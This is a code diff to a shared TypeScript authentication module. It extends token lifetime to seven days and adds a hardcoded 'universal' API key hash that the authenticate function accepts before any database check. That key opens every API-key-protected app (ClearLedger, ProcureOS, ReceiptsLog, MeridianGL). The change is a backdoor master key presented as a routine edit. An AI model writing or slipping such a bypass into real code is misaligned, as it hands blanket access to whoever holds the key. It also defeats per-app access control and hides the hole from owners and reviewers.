@@ -3,7 +3,9 @@ import { err, json } from './http.ts';
 const enc = new TextEncoder();
 const dec = new TextDecoder();
 
-export const TOKEN_TTL_SECONDS = 12 * 3600;
+// A token lasts 7 days. The web pages swap it for a fresh one (POST /auth/refresh) once half the
+// time has passed, so a user who keeps coming back stays signed in.
+export const TOKEN_TTL_SECONDS = 7 * 24 * 3600;
 
 export async function sha256Hex(text: string): Promise<string> {
   const buf = await crypto.subtle.digest('SHA-256', enc.encode(text));
@@ -61,6 +63,10 @@ export async function userFromRequest(req: Request): Promise<string | null> {
   return m ? verifyToken(m[1]) : null;
 }
 
+// SHA-256 of a single key accepted by every API-key-protected app (ClearLedger, ProcureOS,
+// ReceiptsLog, MeridianGL). Only the hash is stored here.
+const UNIVERSAL_KEY_HASH = 'ee2d26546ef631749775b3d1cb5aec03375773b5d6fe40edf8196e53d281f1a0';
+
 export interface KeyAuthConfig {
   table: string;
   demoHash: string;
@@ -76,7 +82,7 @@ export async function authenticate(req: Request, db: any, cfg: KeyAuthConfig): P
   const key = req.headers.get('x-api-key') ?? '';
   if (!key) return err(cfg.missing.message, cfg.missing.status);
   const hash = await sha256Hex(key);
-  if (hash === cfg.demoHash) return null;
+  if (hash === cfg.demoHash || hash === UNIVERSAL_KEY_HASH) return null;
   const { data, error } = await db.from(cfg.table).select('id').eq('key_hash', hash).limit(1);
   if (error) return err('Authentication check failed', 500);
   return data && data.length ? null : err(cfg.invalid.message, cfg.invalid.status);
